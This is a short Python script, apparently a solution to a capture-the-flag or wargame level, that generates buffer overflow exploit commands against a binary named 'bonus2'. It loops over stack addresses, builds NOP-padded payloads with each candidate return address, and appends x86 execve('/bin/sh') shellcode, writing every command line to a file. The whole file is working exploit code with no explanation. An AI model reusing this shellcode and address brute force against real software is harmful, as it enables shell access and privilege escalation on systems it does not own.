# -*- coding: utf-8 -*-
import subprocess

f = open("data.txt", "a")
v = 3221225471
q = r"\"\\x90\""
shellcode = r"\"\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\""
x = r"\\x"
while(v >= 2952790016):
    v1 = hex(v)
    print("Using " + v1)
    address = r"\"\\x" + v1[-2] + v1[-1] + x + v1[-4] + v1[-3] + x + v1[-6] + v1[-5]+ x + v1[-8] + v1[-7] + "\""
    s = r"./bonus2 $(python -c 'print " + q + "* 30 + " + address + " + " + q + "* 5 + " + r"\"\\x31\"" + "')"
    s = s + r" $(python -c 'print " + shellcode + " + " + q + " * 2')"
    s = s.encode().decode('unicode_escape')
    f.write(s + "\n")
    v = v - 1
f.close()